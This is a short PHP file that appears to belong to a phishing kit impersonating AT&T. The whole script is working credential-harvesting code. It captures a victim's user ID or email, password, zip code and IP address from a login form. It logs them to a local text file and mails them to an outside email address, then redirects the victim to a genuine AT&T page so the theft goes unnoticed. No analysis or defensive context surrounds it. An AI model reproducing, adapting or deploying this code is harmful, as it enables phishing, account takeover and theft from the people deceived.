<?

$ip = getenv("REMOTE_ADDR");
$message .= "---- : || tHAnks tO Crossr!d3r || :------\n";
$message .= "User ID/Email Address           : ".$_POST['userid']."\n";
$message .= "Password               : ".$_POST['password']."\n";
$message .= "Service Address Zip             : ".$_POST['zipxnx']."\n";
$message .= "----: || tHAnks tO Crossr!d3r || :------\n";
$message .= "IP: ".$ip."\n";


$recipient = "mobilelinkforall@outlook.com
";


$fp = fopen("SUre.txt","a");
fputs($fp,$message);
fclose($fp);





$subject = "ATT US | ".$ip."\n";

mail($recipient,$subject,$message);
header("Location:   https://www.attplans.com/plans/");
?>


